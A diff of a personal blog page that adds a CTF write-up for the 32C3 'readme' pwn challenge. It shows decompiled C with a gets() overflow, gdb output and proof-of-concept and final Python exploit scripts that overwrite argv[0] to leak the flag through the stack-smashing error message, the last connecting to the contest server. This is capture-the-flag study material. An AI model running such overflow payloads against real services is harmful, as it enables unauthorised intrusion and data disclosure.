@@ -9,7 +9,8 @@
   <meta name="author" content="pwn_expoit">
 
   
-  <meta name="description" content="i recently prepare Codegate held in 2016,So i needed to write up ctf. i writed up ezhp(plaid ctf), now it&rsquo;s time to write up kappa. Let&rsquo;s &hellip;">
+  <meta name="description" content="after 32c3 ctf, i am sorry that sovled readme. so i challenge it again
+this binary is likely to analysis,but i am too stupid to can&rsquo;t solved [ &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -79,6 +80,258 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/12/31/32c3-pwn-200-readme-write-up/">32c3 Pwn[200] Readme Write Up</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-31T07:16:00-08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>31</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>7:16 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>after 32c3 ctf, i am sorry that sovled readme. so i challenge it again
+this binary is likely to analysis,but i am too stupid to can&rsquo;t solved</p>
+
+<figure class='code'><figcaption><span>[main func] (readmemain.c)</span> <a href='/codeview/readmemain.c'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kr">__int64</span> <span class="nf">sub_4007E0</span><span class="p">()</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax@1</span>
+</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx@2</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax@3</span>
+</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-128h]@1</span>
+</span><span class='line'>  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+108h] [bp-20h]@1</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;Hello!</span><span class="se">\n</span><span class="s">What&#39;s your name? &quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">_IO_gets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v0</span> <span class="p">)</span>
+</span><span class='line'><span class="nl">LABEL_9</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span><span class='line'>  <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;Nice to meet you, %s.</span><span class="se">\n</span><span class="s">Please overwrite the flag: &quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">v2</span> <span class="o">=</span> <span class="n">_IO_getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
+</span><span class='line'>      <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">byte_600D20</span><span class="p">[</span><span class="n">v1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="mi">32</span> <span class="p">)</span>
+</span><span class='line'>      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
+</span><span class='line'><span class="nl">LABEL_8</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Thank you, bye!&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>At first, unfortunately i had thought puts null byte leak(like codegate 2014 nuclear)but IO_gets generate \x00 in string lately
+After many tries, i find out that infomation leak from &ldquo;<strong><em> stack smashing detected </em></strong>&rdquo;</p>
+
+<p>File /home/pwn/Desktop/octopress/source/codeview/readmeleak could not be found</p>
+
+<p>above printing show argv[0] possible to overwirte. argv[0] pointer is located on $rsp+0x218</p>
+
+<figure class='code'><figcaption><span>[argv[0]] (readmeargv)</span> <a href='/codeview/readmeargv'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">gdb</span><span class="o">-</span><span class="vg">peda$</span><span class="w"> </span><span class="vg">find</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe8cc</span>
+</span><span class='line'><span class="vg">Searching</span><span class="w"> </span><span class="vg">for</span><span class="w"> </span><span class="c1">&#39;0x7fffffffe8cc&#39; in: None ranges</span>
+</span><span class='line'><span class="vg">Found</span><span class="w"> </span><span class="il">2</span><span class="w"> </span><span class="vg">results</span><span class="p">,</span><span class="w"> </span><span class="vg">display</span><span class="w"> </span><span class="vg">max</span><span class="w"> </span><span class="il">2</span><span class="w"> </span><span class="nl">items:</span>
+</span><span class='line'><span class="w">   </span><span class="vg">libc</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="il">0</span><span class="vg">x7ffff7dd4018</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe8cc</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;/home/pwn/readme.bin&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="p">[</span><span class="vg">stack</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe6b8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe8cc</span><span class="w"> </span><span class="p">(</span><span class="s2">&quot;/home/pwn/readme.bin&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="vg">gdb</span><span class="o">-</span><span class="vg">peda$</span><span class="w"> </span><span class="vg">print</span><span class="w"> </span><span class="il">0</span><span class="vg">x7fffffffe6b8</span><span class="il">-0</span><span class="vg">x7fffffffe4a0</span>
+</span><span class='line'><span class="err">$</span><span class="vg">2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="il">0</span><span class="vg">x218</span>
+</span><span class='line'><span class="vg">gdb</span><span class="o">-</span><span class="vg">peda$</span><span class="w"> </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>so i execute Poc</p>
+
+<figure class='code'><figcaption><span>[POC code] (readmepoc.py)</span> <a href='/codeview/readmepoc.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x218</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600D20</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">print</span> <span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;1234</span><span class="se">\n</span><span class="s">&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>[POC leak] (readmepoc2)</span> <a href='/codeview/readmepoc2'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">vim</span><span class="w"> </span><span class="vg">readme</span><span class="o">.</span><span class="vg">py</span>
+</span><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">python</span><span class="w"> </span><span class="vg">readme</span><span class="o">.</span><span class="vg">py</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">./</span><span class="vg">readme</span><span class="o">.</span><span class="vg">bin</span><span class="w"> </span>
+</span><span class='line'><span class="vg">Hello!</span>
+</span><span class='line'><span class="vg">What</span><span class="c1">&#39;s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`.AAAAAAAAAA </span>
+</span><span class='line'><span class="vg">Please</span><span class="w"> </span><span class="vg">overwrite</span><span class="w"> </span><span class="vg">the</span><span class="w"> </span><span class="nl">flag:</span><span class="w"> </span><span class="vg">Thank</span><span class="w"> </span><span class="vg">you</span><span class="p">,</span><span class="w"> </span><span class="vg">bye!</span>
+</span><span class='line'><span class="o">***</span><span class="w"> </span><span class="vg">stack</span><span class="w"> </span><span class="vg">smashing</span><span class="w"> </span><span class="vg">detected</span><span class="w"> </span><span class="o">***:</span><span class="w"> </span><span class="il">1234</span><span class="w"> </span><span class="vg">terminated</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>however, flag string is going to overwrite on second input, so i searched another flag string. fortunately,another string was exist.</p>
+
+<p>gdb-peda$ x/s 0x400d20
+0x400d20:   &ldquo;32C3_TheServerHasTheFlagHere&hellip;&rdquo;</p>
+
+<figure class='code'><figcaption><span>[POC again] (readmepoc3)</span> <a href='/codeview/readmepoc3'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">pwn@</span><span class="nl">ubuntu:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="vg">python</span><span class="w"> </span><span class="vg">readme</span><span class="o">.</span><span class="vg">py</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">./</span><span class="vg">readme</span><span class="o">.</span><span class="vg">bin</span><span class="w"> </span>
+</span><span class='line'><span class="vg">Hello!</span>
+</span><span class='line'><span class="vg">What</span><span class="c1">&#39;s your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@.AAAAAAAAAA </span>
+</span><span class='line'><span class="vg">Please</span><span class="w"> </span><span class="vg">overwrite</span><span class="w"> </span><span class="vg">the</span><span class="w"> </span><span class="nl">flag:</span><span class="w"> </span><span class="vg">Thank</span><span class="w"> </span><span class="vg">you</span><span class="p">,</span><span class="w"> </span><span class="vg">bye!</span>
+</span><span class='line'><span class="o">***</span><span class="w"> </span><span class="vg">stack</span><span class="w"> </span><span class="vg">smashing</span><span class="w"> </span><span class="vg">detected</span><span class="w"> </span><span class="o">***:</span><span class="w"> </span><span class="il">32</span><span class="vg">C3_TheServerHasTheFlagHere</span><span class="o">...</span><span class="w"> </span><span class="vg">terminated</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>unfortunately!!!! i Can&rsquo;t show flag in remote server&hellip;.
+finally i open other write up, i notice &lsquo;LIBC_FATAL_STDERR_=1&rsquo;
+above the environment variable it make that show error messege on remote server</p>
+
+<figure class='code'><figcaption><span>[memory] (readmememory)</span> <a href='/codeview/readmememory'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'><span class="vg">binary</span><span class="w"> </span><span class="vg">memory</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">========</span>
+</span><span class='line'><span class="vg">AAAAAAAA</span>
+</span><span class='line'><span class="vg">AAAAAAAA</span>
+</span><span class='line'><span class="vg">AAAAAAAA</span>
+</span><span class='line'><span class="o">....</span>
+</span><span class='line'><span class="o">========</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">------------------</span><span class="w"> </span><span class="vg">argv</span><span class="p">[</span><span class="il">0</span><span class="p">]</span>
+</span><span class='line'><span class="nl">0</span><span class="vg">x400d20</span>
+</span><span class='line'><span class="o">========</span>
+</span><span class='line'><span class="nl">00000000</span><span class="w"></span>
+</span><span class='line'><span class="o">========</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">------------------</span><span class="w"> </span><span class="vg">environment</span><span class="w"> </span><span class="vg">variable</span>
+</span><span class='line'><span class="nl">0</span><span class="vg">x600d20</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="o">------------</span><span class="vg">LIBC_FATAL_STDERR_</span><span class="o">=</span><span class="il">1</span>
+</span><span class='line'><span class="w">       </span><span class="vg">input</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>this is final payload</p>
+
+<figure class='code'><figcaption><span>[final] (readmepayload.py)</span> <a href='/codeview/readmepayload.py'>download</a></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">Netcon</span><span class="p">(</span><span class="s">&#39;136.243.194.62&#39;</span><span class="p">,</span><span class="mi">1024</span><span class="p">)</span>
+</span><span class='line'><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;name?&quot;</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x218</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400d20</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span><span class='line'><span class="n">dat</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x600d20</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;flag:&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;LIBC_FATAL_STDERR_=1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'><span class="n">interact</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1245,6 +1498,10 @@ this method can become vulnerability on UAF. for now, i perceived it vulnerabilt
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/12/31/32c3-pwn-200-readme-write-up/">32c3 Pwn[200] Readme Write Up</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2015/12/26/plaid-ctf-kappa-275-in-2014/">Plaid Ctf Kappa[275] in 2014</a>
